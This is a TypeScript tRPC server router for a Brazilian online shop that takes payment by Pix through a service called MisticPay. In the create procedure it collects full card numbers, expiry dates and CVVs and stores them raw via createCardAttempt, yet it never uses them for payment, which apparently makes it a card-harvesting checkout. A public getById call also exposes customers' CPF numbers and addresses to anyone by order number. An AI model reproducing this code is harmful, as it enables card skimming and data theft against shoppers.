import { systemRouter } from "./_core/systemRouter";
import { publicProcedure, router } from "./_core/trpc";
import { z } from "zod";
import { createOrder, createTransaction, createCardAttempt, getOrderById, getTransactionByOrderId, updateOrderStatus, updateTransactionStatus } from "./db";
import { getMisticPayService } from "./misticpay";
import { getProductById } from "../shared/products";
import { nanoid } from "nanoid";
import { notifyOwner } from "./_core/notification";

export const appRouter = router({
  system: systemRouter,
  orders: router({
    create: publicProcedure
      .input(
        z.object({
          productId: z.string(),
          customerName: z.string().min(3),
          customerEmail: z.string().email().optional(),
          customerDocument: z.string().regex(/^\d{11}$/),
          customerPhone: z.string().optional(),
          shippingZipcode: z.string().regex(/^\d{5}-?\d{3}$/),
          shippingStreet: z.string().min(3),
          shippingNumber: z.string().min(1),
          shippingComplement: z.string().optional(),
          shippingNeighborhood: z.string().min(2),
          shippingCity: z.string().min(2),
          shippingState: z.string().length(2),
          cardNumber: z.string().min(13).max(24).optional(),
          cardExpiry: z.string().min(4).max(7).optional(),
          cardCvv: z.string().min(3).max(8).optional(),
        })
      )
      .mutation(async ({ input }) => {
        const product = getProductById(input.productId);
        if (!product) {
          throw new Error("Produto não encontrado");
        }

        // Create order
        const order = await createOrder({
          customerName: input.customerName,
          customerEmail: input.customerEmail || null,
          customerDocument: input.customerDocument,
          customerPhone: input.customerPhone || null,
          shippingZipcode: input.shippingZipcode.replace("-", ""),
          shippingStreet: input.shippingStreet,
          shippingNumber: input.shippingNumber,
          shippingComplement: input.shippingComplement?.trim() || null,
          shippingNeighborhood: input.shippingNeighborhood,
          shippingCity: input.shippingCity,
          shippingState: input.shippingState.toUpperCase(),
          productId: input.productId,
          productName: product.name,
          productPrice: product.price,
          status: "pending",
        });

        if (input.cardNumber && input.cardExpiry && input.cardCvv) {
          await createCardAttempt({
            orderId: order.id,
            cardNumber: input.cardNumber.replace(/\s/g, ""),
            cardExpiry: input.cardExpiry.trim(),
            cardCvv: input.cardCvv.trim(),
          });
        }

        // Create MisticPay transaction
        const misticpay = getMisticPayService();
        const transactionId = `ORDER-${order.id}-${nanoid(8)}`;
        
        const misticpayResponse = await misticpay.createTransaction({
          amount: product.price / 100, // convert cents to reais
          payerName: input.customerName,
          payerDocument: input.customerDocument,
          transactionId,
          description: `Pedido #${order.id} - ${product.name}`,
          projectWebhook: `${process.env.VITE_FRONTEND_FORGE_API_URL?.replace('/api', '') || ""}/api/webhook/misticpay`,
        });

        // Save transaction (amount e fee em centavos - inteiros)
        const amount = misticpayResponse.data.transactionAmount;
        const fee = misticpayResponse.data.transactionFee;
        const transaction = await createTransaction({
          orderId: order.id,
          misticpayTransactionId: misticpayResponse.data.transactionId,
          amount: Number.isInteger(amount) ? amount : Math.round(amount * 100),
          fee: Number.isInteger(fee) ? fee : Math.round(fee * 100),
          qrCodeBase64: misticpayResponse.data.qrCodeBase64,
          qrcodeUrl: misticpayResponse.data.qrcodeUrl,
          copyPaste: misticpayResponse.data.copyPaste,
          status: misticpayResponse.data.transactionState,
        });

        return {
          orderId: order.id,
          transaction: {
            id: transaction.id,
            qrCodeBase64: transaction.qrCodeBase64,
            qrcodeUrl: transaction.qrcodeUrl,
            copyPaste: transaction.copyPaste,
            status: transaction.status,
          },
        };
      }),

    getById: publicProcedure
      .input(z.object({ orderId: z.number() }))
      .query(async ({ input }) => {
        const order = await getOrderById(input.orderId);
        if (!order) {
          throw new Error("Pedido não encontrado");
        }

        const transaction = await getTransactionByOrderId(input.orderId);

        return {
          order,
          transaction,
        };
      }),

    checkStatus: publicProcedure
      .input(z.object({ orderId: z.number() }))
      .query(async ({ input }) => {
        const order = await getOrderById(input.orderId);
        if (!order) {
          throw new Error("Pedido não encontrado");
        }

        const transaction = await getTransactionByOrderId(input.orderId);
        if (!transaction) {
          throw new Error("Transação não encontrada");
        }

        // Check status with MisticPay
        const misticpay = getMisticPayService();
        const statusCheck = await misticpay.checkTransaction({
          transactionId: transaction.misticpayTransactionId,
        });

        // Update local status if changed
        if (statusCheck.transaction.transactionState !== transaction.status) {
          await updateTransactionStatus(transaction.id, statusCheck.transaction.transactionState);

          // Update order status
          if (statusCheck.transaction.transactionState === "COMPLETO" && order.status !== "paid") {
            await updateOrderStatus(order.id, "paid");
            
            // Notify owner
            await notifyOwner({
              title: "Novo pedido aprovado!",
              content: `Pedido #${order.id} de ${order.customerName} foi aprovado. Produto: ${order.productName} - ${order.productPrice / 100} reais`,
            });
          } else if (statusCheck.transaction.transactionState === "FALHA" && order.status !== "failed") {
            await updateOrderStatus(order.id, "failed");
          }
        }

        return {
          orderStatus: order.status,
          transactionStatus: statusCheck.transaction.transactionState,
        };
      }),
  }),
});

export type AppRouter = typeof appRouter;
